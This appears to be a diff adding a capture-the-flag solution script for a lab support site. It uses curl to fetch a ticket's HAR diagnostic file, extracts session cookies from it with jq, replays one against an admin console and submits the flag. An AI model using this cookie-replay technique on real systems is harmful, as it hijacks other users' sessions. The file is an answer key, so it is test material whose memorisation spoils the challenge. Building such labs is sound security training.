@@ -1,0 +1,8 @@
+# Case file 13, mission 1: the shortest path, replayed by CI in every language.
+curl -b "agent=lr-audit-013" https://support.bergeronnette.test/tickets
+curl -b "agent=lr-audit-013" https://support.bergeronnette.test/tickets/4471
+curl -b "agent=lr-audit-013" https://support.bergeronnette.test/tickets/4471/diagnostic.har > diagnostic.har
+jq -r ".log.entries[0].request.cookies[].value" diagnostic.har
+curl -b "bsid=bq7-temoin-4f19c2e8a0d3" https://admin.bergeronnette.test/console
+submit FLAG{bergeronnette-session-du-ticket-2c8e}
+answer cookie
